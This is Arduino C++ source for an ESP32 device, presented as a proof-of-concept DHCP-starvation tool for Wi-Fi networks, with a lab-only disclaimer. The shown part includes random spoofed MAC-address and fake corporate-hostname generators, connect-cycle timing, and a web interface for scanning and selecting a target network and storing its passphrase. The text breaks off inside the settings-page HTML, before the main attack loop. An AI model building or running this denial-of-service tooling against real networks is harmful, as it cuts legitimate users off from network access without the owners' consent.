/* 
 *---------------------------------------------------------------------------------------------------
 * Info 
 *--------------------------------------------------------------------------------------------------- 
 *  Proof-of-concept code to demonstrates DHCP-starvation mechanics on Wi-Fi networks using an esp32
 *  
 *  This script will start up a WiFi caled "Sinkhole" with the passphrase of 12345678 that you can
 *  connect to and configure the test. 
 *  
 *  When the test starts the wifi will shut down and the program will continue to run untill the 
 *  battery runs dry or the unit is turned off.
 *  
 *  (C)opyleft Keld Norman, Okt 2025.
 *---------------------------------------------------------------------------------------------------
 * Disclaimer
 *--------------------------------------------------------------------------------------------------- 
 * This code should only be used for educational and authorized testing in a closed lab you control 
 * or have the network owner’s explicit written consent for - Do not use on production networks. 
 * By using this code you accept full responsibility.
 * ---------------------------------------------------------------------------------------------------
 * Hardware:
 * ---------------------------------------------------------------------------------------------------
 * This code is written for an esp32c6 bought on https://www.aliexpress.com with an external antenna
 * for around 16$ including shipment -> https://www.aliexpress.com/item/1005006935181127.html
 * 
 * ---------------------------------------------------------------------------------------------------
 * How to setup the Arduino framework:
 * ---------------------------------------------------------------------------------------------------
 *  In Arduino select file -> Preferences -> Additional Boards Manager URL's ->
 *  
 *  Add this URL: https://espressif.github.io/arduino-esp32/package_esp32_index.json
 * 
 * Then go to tools menu -> find the Boards Manager -> Search here for esp32
 *  Install the esp32 by Espressif Systems ( when i did this it was in version 3.3.1 )
 *  
 * Now select the board by again starting at the Tools menu 
 *  -> find the Boards sub menu 
 *   -> select ESP32 Arduino menu 
 *    -> Select the ESP32C6 Dev module
 * ---------------------------------------------------------------------------------------------------
*/
//----------------------------------------------------------------------------------------------------
// INCLUDES
//----------------------------------------------------------------------------------------------------
#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <Preferences.h>
#include <esp_wifi.h>
#include <esp_netif.h>
#include <esp_pm.h>
#include <vector>
#include <pgmspace.h>
//
// NOTE ABOUT DOWNLOAD EMBEDDING:
// Embedding the entire file inside itself is recursive. So:
//  - SRC_TXT is a short note.
//
//  - /download serves SRC_TXT_FULL, a compile-ready copy where ONLY the big download-string block is replaced by a one-liner. All functional code is present.
//
static const char* SRC_TXT = "Open /download to get the full source (the large download-string is replaced to avoid recursion).\n";
static const char* SRC_TXT_FULL = nullptr;
//----------------------------------------------------------------------------------------------------
// VARIABLES
//----------------------------------------------------------------------------------------------------
using std::vector;
struct ApRec { String ssid; int32_t rssi; String auth; String bssid; };
static WebServer   server(80);
static DNSServer   dnsServer;
static Preferences prefs;
static const uint32_t SERIAL_BAUD = 9600;
static const uint32_t WIFI_TEST_TIMEOUT_MS = 15000;
static const uint32_t CYCLE_CONNECT_TIMEOUT_MS = 8000;
static const uint32_t MIN_PAUSE_MS = 500;
static const char*   DEF_AP_SSID = "Sinkhole";
static const char*   DEF_AP_PASS = "12345678";
static const uint8_t CFG_AP_CHAN = 1;
static const int ANT_PWR_GPIO = 3;
static const int ANT_SEL_GPIO = 14;
static const IPAddress AP_IP(10,13,37,1);
static const IPAddress AP_GW(10,13,37,1);
static const IPAddress AP_MASK(255,255,255,0);
static const char* INITIAL_HOSTNAME = "Desktop";
static String g_target_ssid;
static String g_target_bssid;
static String g_wifi_pass;
static String g_target_wpa = "WPA2";
static String g_country = "DK";
static String g_theme   = "ANIMALS";
static String g_custom_base;
static uint64_t g_custom_seq = 1;
static bool   g_config_locked = false;
static String g_ap_ssid;
static String g_ap_pass;
static bool   g_ext_ant = false;     // NEW: external antenna setting (persisted). Default OFF.
static esp_pm_lock_handle_t g_no_ls_lock = nullptr;
static uint32_t g_cycle = 0;
static const int BOOT_HOLD_GPIO = 9;
static const uint32_t BOOT_HOLD_MS = 3000;
static const char* THEME_IT[]     = {"BSOD","PANIC","OOPS","LOLCAT","OWNED","ERROR","PWND","HACKZ","PROXY","SUDO","NULL","WORM"};
static const char* THEME_FOOD[]   = {"PIZZA","TACO","SUSHI","KEBAB","PASTA","DONUT","COCOA","LATTE","CIDER","BEER","RUM","GIN"};
static const char* THEME_GAMES[]  = {"MARIO","LINK","ZELDA","SONIC","DOOM","PONG","TETRIS","PACMAN","QUAKE","DIABLO","LARA"};
static const char* THEME_SPACE[]  = {"MARS","LUNA","JUNO","TITAN","IO","VULCAN","WARP","BORG","SPOCK","YODA","DROID","ALIEN"};
static const char* THEME_FUNNY[]  = {"DERP","LOL","OMG","WTF","MEH","ROFL","YEET","SUS","UWU","PEPE","TROLL","MEME"};
static const char* THEME_MUSIC[]  = {"ELVIS","QUEEN","ACDC","METAL","JAZZ","FUNK","BLUES","OPERA","DISCO","EMO","RAPPER"};
static const char* THEME_NATURE[] = {"FIRE","LAVA","WIND","RAIN","SNOW","ICE","ROCK","TREE","LEAF","ROOT","SAND","WAVE","STAR"};
static const char* THEME_ANIMALS[]= {"CAT","DOG","FOX","BAT","OWL","ELK","LION","BEAR","DEER","SWAN","DUCK","CRAB","TUNA","SEAL","CROW"};
struct Theme { const char* name; const char** words; size_t n; };
static const Theme THEMES[] = {
  {"IT", THEME_IT, sizeof(THEME_IT)/sizeof(THEME_IT[0])},
  {"FOOD", THEME_FOOD, sizeof(THEME_FOOD)/sizeof(THEME_FOOD[0])},
  {"GAMES", THEME_GAMES, sizeof(THEME_GAMES)/sizeof(THEME_GAMES[0])},
  {"SPACE", THEME_SPACE, sizeof(THEME_SPACE)/sizeof(THEME_SPACE[0])},
  {"FUNNY", THEME_FUNNY, sizeof(THEME_FUNNY)/sizeof(THEME_FUNNY[0])},
  {"MUSIC", THEME_MUSIC, sizeof(THEME_MUSIC)/sizeof(THEME_MUSIC[0])},
  {"NATURE", THEME_NATURE, sizeof(THEME_NATURE)/sizeof(THEME_NATURE[0])},
  {"ANIMALS", THEME_ANIMALS, sizeof(THEME_ANIMALS)/sizeof(THEME_ANIMALS[0])},
};
static uint32_t xr;
static uint32_t xrand(){ xr ^= xr<<13; xr ^= xr>>17; xr ^= xr<<5; return xr; }
static void seed_rng(){ xr = esp_random() ^ millis() ^ (uint32_t)esp_timer_get_time(); }
//----------------------------------------------------------------------------------------------------
// Helpers: country, MAC/SSID guards
//----------------------------------------------------------------------------------------------------
static String esc(const String& s){
  String o; o.reserve(s.length()+8);
  for(size_t i=0;i<s.length();++i){
    char c=s[i];
    if(c=='&')      o += F("&amp;");
    else if(c=='<') o += F("&lt;");
    else if(c=='>') o += F("&gt;");
    else if(c=='"') o += F("&quot;");
    else            o += c;
  }
  return o;
}
static void set_country(const String& cc){
  wifi_country_t c = {};
  String s = cc.length()==2 ? cc : "DK";
  s.toUpperCase();
  c.cc[0]=s[0]; c.cc[1]=s[1]; c.cc[2]=0;
  c.schan = 1;
  if(s=="JP")       c.nchan = 14;
  else if(s=="US"||s=="CA"||s=="TW") c.nchan = 11;
  else              c.nchan = 13;
  c.max_tx_power = 20;
  c.policy = WIFI_COUNTRY_POLICY_AUTO;
  esp_wifi_set_country(&c);
}
static String mac_to_string(const uint8_t m[6]){
  char out[20]; snprintf(out,sizeof(out),"%02X:%02X:%02X:%02X:%02X:%02X",m[0],m[1],m[2],m[3],m[4],m[5]); return String(out);
}
static String current_ap_ssid(){ return g_ap_ssid.length()?g_ap_ssid:String(DEF_AP_SSID); }
static String current_ap_mac(){
  uint8_t mac[6]; if(esp_wifi_get_mac(WIFI_IF_AP, mac)==ESP_OK) return mac_to_string(mac);
  return String();
}
static bool is_own_network(const String& ssid, const String& bssid_opt){
  if(ssid.length() && ssid == current_ap_ssid()) return true;
  String apm = current_ap_mac();
  if(apm.length() && bssid_opt.length() && bssid_opt.equalsIgnoreCase(apm)) return true;
  return false;
}
//----------------------------------------------------------------------------------------------------
// Antenna control
//----------------------------------------------------------------------------------------------------
static void apply_antenna(){
  if(g_ext_ant){
    pinMode(3, OUTPUT); digitalWrite(3, LOW);
    pinMode(14, OUTPUT); digitalWrite(14, HIGH);
  }else{
    pinMode(14, INPUT);
    pinMode(3, INPUT);
  }
}
//----------------------------------------------------------------------------------------------------
// Hostname generation
//----------------------------------------------------------------------------------------------------
static String random_word_from_theme(const String& name){
  for(const auto& t: THEMES){
    if(name.equalsIgnoreCase(t.name)){
      size_t idx = xrand() % t.n;
      return String(t.words[idx]);
    }
  }
  const Theme& t = THEMES[0];
  return String(t.words[xrand()%t.n]);
}
static String sanitize_base(const String& in){
  String o;
  for(size_t i=0;i<in.length();++i){
    char c = in[i];
    if((c>='a'&&c<='z')||(c>='A'&&c<='Z')||(c>='0'&&c<='9')||c=='-'||c=='_') o+=c;
  }
  if(o.length()>10) o.remove(10);
  return o;
}
static void persist_seq(){
  if(prefs.begin("cfg", false)){
    char buf[24];
    snprintf(buf,sizeof(buf),"%llu",(unsigned long long)g_custom_seq);
    prefs.putString("seq", buf);
    prefs.end();
  }
}
static String make_hostname(){
  if(g_theme.equalsIgnoreCase("CUSTOM")){
    String base = sanitize_base(g_custom_base);
    if(base.length()<3) base="HOST";
    unsigned long long cur=(unsigned long long)g_custom_seq;
    String hn = base + "-" + String(cur);
    if(g_custom_seq<9999999999ULL) g_custom_seq++; else g_custom_seq=1;
    persist_seq();
    return hn;
  }
  static const char* PREFIXES[]={"PC","LAPTOP","DESKTOP","WIN10","WIN11","CORP","DEV","HR","OFFICE"};
  String p=PREFIXES[xrand()%(sizeof(PREFIXES)/sizeof(PREFIXES[0]))];
  String w=random_word_from_theme(g_theme);
  int num=(int)(xrand()%99)+1;
  char buf[48]; snprintf(buf,sizeof(buf),"%s-%s%02d",p.c_str(),w.c_str(),num);
  return String(buf);
}
static void make_laa_mac(uint8_t out[6]){
  uint32_t r1=xrand(), r2=xrand();
  out[0]=(uint8_t)((r1)&0xFE)|0x02;
  out[1]=(uint8_t)((r1>>8)&0xFF);
  out[2]=(uint8_t)((r1>>16)&0xFF);
  out[3]=(uint8_t)((r2)&0xFF);
  out[4]=(uint8_t)((r2>>8)&0xFF);
  out[5]=(uint8_t)((r2>>16)&0xFF);
}
static void mac_to_str(const uint8_t m[6], char* out, size_t n){
  snprintf(out,n,"%02X:%02X:%02X:%02X:%02X:%02X",m[0],m[1],m[2],m[3],m[4],m[5]);
}
//----------------------------------------------------------------------------------------------------
// Wi-Fi helpers
//----------------------------------------------------------------------------------------------------
static bool wait_for_ip(uint32_t timeout_ms){
  uint32_t t0=millis();
  while(millis()-t0<timeout_ms){
    if(WiFi.status()==WL_CONNECTED){
      if(WiFi.localIP()!=IPAddress((uint32_t)0)) return true;
    }
    delay(50);
  }
  return false;
}
static void set_all_hostnames(const char* hn){
  WiFi.setHostname(hn);
  if(esp_netif_t* sta=esp_netif_get_handle_from_ifkey("WIFI_STA_DEF")) esp_netif_set_hostname(sta,hn);
  if(esp_netif_t* ap =esp_netif_get_handle_from_ifkey("WIFI_AP_DEF"))  esp_netif_set_hostname(ap,hn);
#ifdef ARDUINO_ARCH_ESP32
  WiFi.softAPsetHostname(hn);
#endif
}
static void load_prefs(){
  if(!prefs.begin("cfg", true)) return;
  g_target_ssid = prefs.getString("ssid", g_target_ssid);
  g_wifi_pass   = prefs.getString("wifi_pass", g_wifi_pass);
  g_target_wpa  = prefs.getString("wpa",  g_target_wpa);
  g_theme       = prefs.getString("theme", g_theme);
  g_country     = prefs.getString("cc", g_country);
  g_custom_base = prefs.getString("base", g_custom_base);
  g_ap_ssid     = prefs.getString("ap_ssid", "");
  g_ap_pass     = prefs.getString("ap_pass", "");
  g_ext_ant     = prefs.getBool("ext_ant", false);   // NEW
  String seqStr = prefs.getString("seq", "");
  if(seqStr.length()){
    unsigned long long tmp=strtoull(seqStr.c_str(),nullptr,10);
    if(tmp>=1 && tmp<=9999999999ULL) g_custom_seq=(uint64_t)tmp;
  }
  prefs.end();
}
static void save_all_prefs(bool common, bool settings){
  if(!prefs.begin("cfg", false)) return;
  if(common){
    prefs.putString("ssid", g_target_ssid);
    prefs.putString("wifi_pass", g_wifi_pass);
    prefs.putString("wpa", g_target_wpa);
  }
  if(settings){
    prefs.putString("cc", g_country);
    prefs.putString("theme", g_theme);
    prefs.putString("base", g_custom_base);
    prefs.putString("ap_ssid", g_ap_ssid);
    prefs.putString("ap_pass", g_ap_pass);
    prefs.putBool("ext_ant", g_ext_ant);           // NEW
  }
  prefs.end();
}
static void clear_all_prefs(){
  if(prefs.begin("cfg", false)){ prefs.clear(); prefs.end(); }
}
static void wifi_prepare(wifi_mode_t mode, const char* hn){
  set_country(g_country);
  WiFi.mode(mode);
  WiFi.persistent(false);
  WiFi.setSleep(false);
  esp_wifi_set_ps(WIFI_PS_NONE);
  if(hn) set_all_hostnames(hn);
}
static void begin_target(){
  if(g_target_wpa.equalsIgnoreCase("OPEN") || g_wifi_pass.length()==0){
    WiFi.begin(g_target_ssid.c_str());
  }else{
    WiFi.begin(g_target_ssid.c_str(), g_wifi_pass.c_str());
  }
}
static void tune_ap_fast_vis(){
  wifi_config_t ap{};
  esp_wifi_get_config(WIFI_IF_AP, &ap);
  ap.ap.channel = CFG_AP_CHAN;
  ap.ap.beacon_interval = 50;
  ap.ap.max_connection = 8;
  ap.ap.ssid_hidden = 0;
  ap.ap.pmf_cfg.capable = true;
  ap.ap.pmf_cfg.required = false;
  esp_wifi_set_config(WIFI_IF_AP, &ap);
  esp_wifi_set_max_tx_power(84);
  esp_wifi_set_protocol(WIFI_IF_AP, WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
}
//----------------------------------------------------------------------------------------------------
// HTTP helpers
//----------------------------------------------------------------------------------------------------
static void set_no_cache_headers(){
  server.sendHeader("Cache-Control","no-store, no-cache, must-revalidate, max-age=0");
  server.sendHeader("Pragma","no-cache");
  server.sendHeader("Expires","0");
  server.sendHeader("Connection","close");
}
static void send_html_nocache(const String& html){ set_no_cache_headers(); server.send(200,"text/html; charset=utf-8",html); }
static void send_json_nocache(const String& json){ set_no_cache_headers(); server.send(200,"application/json; charset=utf-8",json); }
static void send_redirect_nocache(const String& url){ set_no_cache_headers(); server.sendHeader("Location",url); server.send(302,"text/plain",""); }
//----------------------------------------------------------------------------------------------------
// Auth string
//----------------------------------------------------------------------------------------------------
static String auth_to_str(wifi_auth_mode_t m){
  switch(m){
    case WIFI_AUTH_OPEN: return "OPEN";
    case WIFI_AUTH_WPA2_PSK: return "WPA2";
    case WIFI_AUTH_WPA3_PSK: return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/3";
    case WIFI_AUTH_WEP: return "WEP";
    default: return "WPA2";
  }
}
//----------------------------------------------------------------------------------------------------
// Country label helper (kept for future use)
//----------------------------------------------------------------------------------------------------
static String country_label(const String& ccIn){
  String cc = ccIn; cc.toUpperCase();
  if(cc=="DK") return "DK (Denmark)";
  if(cc=="SE") return "SE (Sweden)";
  if(cc=="NO") return "NO (Norway)";
  if(cc=="DE") return "DE (Germany)";
  if(cc=="NL") return "NL (Netherlands)";
  if(cc=="UK") return "UK (England)";
  if(cc=="JP") return "JP (Japan)";
  return "DK (Denmark)";
}
//----------------------------------------------------------------------------------------------------
// HTML: Frontpage
//----------------------------------------------------------------------------------------------------
static String html_form(){
  auto sel=[&](const String& a,const char* b){ return a.equalsIgnoreCase(b)?" selected":""; };
  String wpaOpts;
  wpaOpts+=String("<option")+sel(g_target_wpa,"OPEN")+">OPEN</option>";
  wpaOpts+=String("<option")+sel(g_target_wpa,"WPA2")+">WPA2</option>";
  wpaOpts+=String("<option")+sel(g_target_wpa,"WPA3")+">WPA3</option>";

  const String apS=current_ap_ssid();
  const String apM=current_ap_mac();
  String apS_js=apS; apS_js.replace("\\","\\\\"); apS_js.replace("'","\\'");
  String apM_js=apM; apM_js.replace("\\","\\\\"); apM_js.replace("'","\\'");

  String h =
  "<!DOCTYPE html><html><head><meta charset='utf-8'>"
  "<meta name='format-detection' content='telephone=no'>"
  "<meta http-equiv='Cache-Control' content='no-store, no-cache, must-revalidate, max-age=0'>"
  "<meta http-equiv='Pragma' content='no-cache'><meta http-equiv='Expires' content='0'>"
  "<meta name='viewport' content='width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no'>"
  "<link rel='prefetch' href='/settings'>"
  "<link rel='prefetch' href='/settings.json'>"
  "<title>Sinkhole Setup</title>"
  "<style>"
  ":root{--bg:#0b0b0b;--fg:#eaeaea;--mut:#a6a6a6;--border:#1f1f1f;--radius:16px}"
  "html,body{margin:0;height:100%;background:var(--bg);color:var(--fg);overflow:hidden}"
  "body{font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial}"
  ".wrap{max-width:740px;margin:0 auto;height:100dvh;display:block;padding:env(safe-area-inset-top) 16px calc(24px + env(safe-area-inset-bottom));overflow:auto;-webkit-overflow-scrolling:touch}"
  ".topbar{position:sticky;top:0;background:var(--bg);border-bottom:1px solid var(--border);z-index:1001}"
  ".topbar .inner{padding:14px 6px;display:flex;align-items:center;justify-content:center;position:relative}"
  ".title{margin:0;color:#ffd400;font-weight:800;font-size:clamp(22px,6vw,30px)}"
  ".gear{position:absolute;right:0;top:50%;transform:translateY(-50%);font-size:26px;text-decoration:none;color:var(--fg)}"
  ".bar{display:flex;gap:12px;margin:12px 0 0}"
  ".list{margin-top:12px;border:1px solid var(--border);border-radius:var(--radius);overflow:hidden}"
  ".item{padding:10px 12px;border-top:1px solid var(--border);background:#101010}"
  ".item:first-child{border-top:0}"
  ".grid{display:grid;grid-template-columns:minmax(0,1fr) 110px 84px 98px;gap:10px;align-items:center}"
  ".ssid{white-space:nowrap;overflow:hidden;text-overflow:ellipsis}"
  ".badge{border:1px solid #3a3a3a;border-radius:999px;padding:4px 10px;font-size:15px;color:#ddd;text-align:center}"
  ".badge.open{border-color:#1e7f52;color:#8cd9b3}"
  ".small{font-size:14px;color:var(--mut);margin-top:6px}"
  ".hidden{display:none}"
  "form{display:flex;flex-direction:column;gap:0;margin-top:12px}"
  "label{display:block;margin:10px 0 6px;font-size:17px;font-weight:600}"
  "input[type=text],input[type=password],select,button{appearance:none;background:#111;color:#eaeaea;border:1px solid #2a2a2a;border-radius:var(--radius);padding:14px 16px;font-size:18px;width:100%;box-sizing:border-box}"
  "input.pf-invalid,select.pf-invalid{background:#2a1515;border-color:#8a4040}"
  ".pwwrap{position:relative;display:block}"
  ".pwwrap input{display:block;width:100%;padding-right:46px}"
  ".eye{position:absolute;right:12px;top:50%;transform:translateY(-50%);display:inline-flex;align-items:center;justify-content:center;line-height:1;font-size:20px;cursor:pointer;user-select:none}"
  "#btnScan{width:100%}"
  "input::placeholder{color:#8a8a8a}"
  "input:focus,select:focus,button:focus{outline:2px solid #6a6a6a;outline-offset:2px}"
  "button{margin-top:14px;border-color:#3a3a3a;cursor:pointer}"
  "button[disabled]{opacity:.45;cursor:default}"
  "button.sm{padding:10px 12px;font-size:15px}"
  ".rssi{font-variant-numeric:tabular-nums;color:#bbb;font-size:15px;text-align:right}"
  ".note{margin-top:8px;color:#d0b200;font-size:16px}"
  ".modal{position:fixed;inset:0;width:100vw;height:100dvh;background:rgba(0,0,0,.9);display:none;align-items:center;justify-content:center;z-index:9999}"
  ".modal .card{color:#fff;font-size:10vw;text-align:center;padding:16px}"
  "@media(min-width:800px){.grid{grid-template-columns:minmax(0,1fr) 130px 92px 110px}}"
  "#scanList .item{padding:4px 8px;border:0;background:transparent}"
  "#scanList .grid{display:grid;grid-template-columns:minmax(0,1fr) 56px 58px 56px;gap:6px;align-items:center;font-size:12px;line-height:1.2}"
  "#scanList .ssid{white-space:nowrap;overflow:hidden;text-overflow:ellipsis}"
  "#scanList .badge{border:1px solid #3a3a3a;border-radius:999px;padding:1px 6px;font-size:11px}"
  "#scanList .badge.open{border-color:#1e7f52;color:#8cd9b3}"
  "#scanList .rssi{font-variant-numeric:tabular-nums;color:#bbb;font-size:12px;text-align:right}"
  "#scanList .pick{padding:6px 8px;font-size:11px;margin:0;line-height:1}"
  "</style></head><body><div class='wrap'>"
  "<div class='topbar'><div class='inner'>"
    "<h2 class='title'>Select target Wi-Fi</h2>"
    "<a href='/settings' id='btnSettingsTop' class='gear' aria-label='Settings'>⚙️</a>"
  "</div><div class='bar'><button type='button' id='btnScan'>Scan Wi-Fi</button></div></div>"
  "<form id='cfgForm' method='POST' action='/test' autocomplete='off'>"
    "<input type='hidden' name='bssid' id='wifi_bssid' value=''>"
    "<div id='manualPanel'>"
      "<label>SSID</label>"
      "<input type='text' name='wifi_ssid' id='wifi_ssid' inputmode='text' autocapitalize='none' autocorrect='off' spellcheck='false' autocomplete='off' required placeholder='Network name' value='" + g_target_ssid + "'>"
      "<div id='ownWarn' class='note' style='display:none'>Targeting the device’s own AP is blocked.</div>"
      "<label id='label_pass'>Passphrase</label>"
      "<div id='manualPassWrap' class='pwwrap'>"
        "<input type='password' name='wifi_pass' id='wifi_pass' minlength='8' maxlength='63' inputmode='text' autocapitalize='none' autocorrect='off' spellcheck='false' autocomplete='new-password' aria-autocomplete='none' enterkeyhint='go' placeholder='Password' value='" + g_wifi_pass + "'>"
        "<span id='eye' class='eye' aria-label='toggle password'>👁</span>"
      "</div>"
      "<label>Security</label><select name='wpa' id='wpa'>" + wpaOpts + "</select>"
    "</div>"
    "<div id='scanPanel'>"
      "<div id='scanStatus' class='small hidden'></div>"
      "<div id='scanList' class='list hidden'></div>"
    "</div>"
    "<div class='actions' id='actions'><button id='btnTest' type='submit' disabled>Test connection</button></div>"
  "</form>"
  "<div id='modal' class='modal'><div id='modalText' class='card'>Scanning…</div></div>"
  "<script>'use strict';"
  "const AP_SSID='"+apS_js+"', AP_BSSID='"+apM_js+"';"
  "function __(id){return document.getElementById(id);} "
  "const wifi_ssid=__('wifi_ssid'), wifi_pass=__('wifi_pass'), wpa=__('wpa'), bssid=__('wifi_bssid');"
  "const lblPass=__('label_pass'), passWrap=__('manualPassWrap');"
  "const ownWarn=__('ownWarn'), btnScan=__('btnScan'), scanList=__('scanList'), scanStatus=__('scanStatus');"
  "const btnTest=__('btnTest'), modal=__('modal'), modalText=__('modalText');"
  "const eye=__('eye'); let passVisible=false;"
  "const form=__('cfgForm');"
  "function isOwn(ss,bs){if(!ss) return false; if(AP_SSID && ss===AP_SSID) return true; if(AP_BSSID && bs) return bs.toUpperCase()===AP_BSSID.toUpperCase(); return false;}"
  "function needsPass(){return wpa.value!=='OPEN';}"
  "function passLenOk(){const n=wifi_pass.value.length; return !needsPass() || (n>=8 && n<=63);}"
  "function paintPass(){wifi_pass.classList.remove('pf-invalid'); if(needsPass() && !passLenOk()) wifi_pass.classList.add('pf-invalid');}"
  "function showHidePass(){const show=needsPass(); if(lblPass) lblPass.style.display=show?'block':'none'; if(passWrap) passWrap.style.display=show?'block':'none'; wifi_pass.disabled=!show; if(!show){wifi_pass.value=''; wifi_pass.classList.remove('pf-invalid');}}"
  "function updateUI(){const own=isOwn(wifi_ssid.value,bssid.value); if(ownWarn) ownWarn.style.display=own?'block':'none'; paintPass(); btnTest.disabled=(!wifi_ssid.value.trim()||own||!passLenOk());}"
  "if(eye){eye.addEventListener('click',()=>{passVisible=!passVisible; wifi_pass.setAttribute('type',passVisible?'text':'password'); eye.textContent=passVisible?'🙈':'👁'; wifi_pass.focus();});}"
  "wifi_ssid.addEventListener('input',updateUI);"
  "wifi_pass.addEventListener('input',()=>{paintPass(); updateUI();});"
  "wpa.addEventListener('change',()=>{showHidePass(); updateUI();});"
  "function authBadge(a){return a==='OPEN'?\"<span class='badge open'>OPEN</span>\":(\"<span class='badge'>\"+a+\"</span>\");}"
  "function showModal(t){modalText.textContent=t||'Working…'; modal.style.display='flex';}"
  "function hideModal(){modal.style.display='none';}"
  "btnTest.addEventListener('click',()=>{ if(btnTest.disabled) return; modalText.textContent='Testing…'; modal.style.display='flex'; });"
  "form.addEventListener('submit',()=>{ modalText.textContent='Testing…'; modal.style.display='flex'; });"
  "function fillFrom(ss,a,bs){ wifi_ssid.value=ss; bssid.value=bs; wpa.value=(a==='OPEN'?'OPEN':(a==='WPA3'?'WPA3':'WPA2')); showHidePass(); if(wpa.value==='OPEN'){ wifi_pass.value=''; } paintPass(); updateUI(); }"
  "async function doScan(){"
    "scanStatus.classList.remove('hidden'); scanStatus.textContent='Scanning…';"
    "scanList.classList.add('hidden'); scanList.innerHTML='';"
    "showModal('Scanning…');"
    "try{const r=await fetch('/scan.json',{cache:'no-store'}); if(!r.ok) throw new Error('HTTP '+r.status); const items=await r.json();"
      "let html='';"
      "for(const it of items){const ss=it.ssid||''; const rs=it.rssi||0; const a=it.auth||'WPA2'; const bs=(it.bssid||'').toUpperCase();"
        "html+=\"<div class='item' data-ssid='\"+encodeURIComponent(ss)+\"' data-auth='\"+a+\"' data-bssid='\"+bs+\"'><div class='grid'>\""
          "+\"<div class='ssid'>\"+ss.replace(/&/g,'&amp;').replace(/</g,'&lt;')+\"</div>\""
          "+authBadge(a)"
          "+\"<div class='rssi'>\"+rs+\" dBm</div>\""
          "+\"<button type='button' class='pick' data-ssid='\"+encodeURIComponent(ss)+\"' data-auth='\"+a+\"' data-bssid='\"+bs+\"'>Pick</button>\""
        "+\"</div></div>\";"
      "}"
      "scanList.innerHTML=html||\"<div class='item'><div class='ssid'>No networks found</div></div>\";"
      "scanList.classList.remove('hidden'); scanStatus.textContent='Tap a row or Pick';"
      "scanList.onclick=function(ev){"
        "const el=ev.target.closest('[data-ssid]'); if(!el) return;"
        "const ss=decodeURIComponent(el.dataset.ssid||''); const a=el.dataset.auth||'WPA2'; const bs=el.dataset.bssid||'';"
        "fillFrom(ss,a,bs); if(needsPass() && wifi_pass.value.length<8) wifi_pass.focus(); window.scrollTo({top:0,behavior:'smooth'});"
      "};"
    "}catch(e){scanStatus.textContent='Scan failed';}finally{hideModal();}"
  "}"
  "btnScan.addEventListener('click',doScan);"
  "showHidePass();"
  "updateUI();"
  "</script></div></body></html>";
  return h;
}
//----------------------------------------------------------------------------------------------------
// Reusable message page
//----------------------------------------------------------------------------------------------------
static String html_msg_page(const String& title,const String& p,const String& extraBtns,bool showWarn=false,const String& warnHtml=""){
  const String titleColor = title.equalsIgnoreCase("CONNECTED") ? "#8cff9b" : "#ffd400";
  String h =
  "<!DOCTYPE html><html><head><meta charset='utf-8'>"
  "<meta http-equiv='Cache-Control' content='no-store, no-cache, must-revalidate, max-age=0'>"
  "<meta http-equiv='Pragma' content='no-cache'><meta http-equiv='Expires' content='0'>"
  "<meta name='viewport' content='width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no'>"
  "<link rel='prefetch' href='/'><title>"+title+"</title><style>"
  ":root{--bg:#0b0b0b;--fg:#eaeaea;--border:#1f1f1f;--radius:16px}"
  "html,body{margin:0;height:100%;background:var(--bg);color:var(--fg)}"
  ".wrap{display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:22px;transform:translateY(-4vh)}"
  "h1{margin:0;line-height:1;font-size:clamp(24px,8vw,40px);color:"+titleColor+";font-weight:800}"
  "p{margin:12px 0 0;font-size:clamp(16px,5vw,20px);text-align:center;max-width:620px}"
  ".warn{margin-top:12px;border:2px solid #c00;background:#fff;color:#111;padding:12px 14px;border-radius:12px;text-align:center;}"
  ".warn .w1{color:#c00;font-size:clamp(20px,6.2vw,24px);font-weight:800;}"
  ".warn .sp{height:8px}"
  ".warn div{font-size:clamp(15px,4.8vw,18px)}"
  ".row{display:flex;gap:14px;margin-top:18px;flex-wrap:wrap;justify-content:center}"
  "button{background:#111;color:var(--fg);border:1px solid #3a3a3a;border-radius:16px;padding:14px 18px;font-size:18px;cursor:pointer}"
  "a.btn{display:inline-block;text-decoration:none;background:#111;color:var(--fg);border:1px solid #3a3a3a;border-radius:16px;padding:14px 18px;font-size:18px}"
  "</style></head><body><div class='wrap'>"
  "<h1>"+title+"</h1><p>"+p+"</p>"+(showWarn?("<div class='warn'>"+warnHtml+"</div>"):"")+extraBtns+
  "</div><script>'use strict';"
  "try{fetch('/',{cache:'no-store',keepalive:true}).catch(()=>{});}catch(e){}"
  "document.addEventListener('click',function(ev){var a=ev.target.closest('a'); if(!a) return; if(a.getAttribute('href')==='/'||a.pathname==='/'){ev.preventDefault(); a.textContent='Loading…'; location.replace('/');}});"
  "</script></body></html>";
  return h;
}
//----------------------------------------------------------------------------------------------------
// HTML: ABOUT
//----------------------------------------------------------------------------------------------------
static String html_about(){
  return
  "<!DOCTYPE html><html><head><meta charset='utf-8'>"
  "<meta name='viewport' content='width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no'>"
  "<title>About</title>"
  "<style>"
  ":root{--bg:#0b0b0b;--fg:#eaeaea;--border:#1f1f1f;--radius:16px}"
  "html,body{margin:0;height:100%;background:var(--bg);color:var(--fg)}"
  "body{font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial}"
  ".wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}"
  ".card{max-width:620px;text-align:center}"
  "h1{margin:0 0 12px 0;font-size:28px}"
  "p{margin:0 0 18px 0;font-size:18px}"
  "a.btn{display:inline-block;text-decoration:none;background:#111;color:var(--fg);border:1px solid #3a3a3a;border-radius:16px;padding:12px 16px;font-size:16px}"
  "</style></head><body><div class='wrap'><div class='card'>"
  "<h1>About</h1>"
  "<p>(C)opyleft Keld Norman, Oct. 2025</p>"
  "<a class='btn' href='/settings'>Back</a>"
  "</div></div></body></html>";
}
//----------------------------------------------------------------------------------------------------
// Settings page HTML (static PROGMEM used by /settings)
//----------------------------------------------------------------------------------------------------
static const char SETTINGS_HTML[] PROGMEM = R"HTML(<!DOCTYPE html><html><head><meta charset='utf-8'>
<meta name='format-detection' content='telephone=no'>
<meta http-equiv='Cache-Control' content='no-store, no-cache, must-revalidate, max-age=0'>
<meta http-equiv='Pragma' content='no-cache'><meta http-equiv='Expires' content='0'>
<meta name='viewport' content='width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no'>
<title>Settings</title>
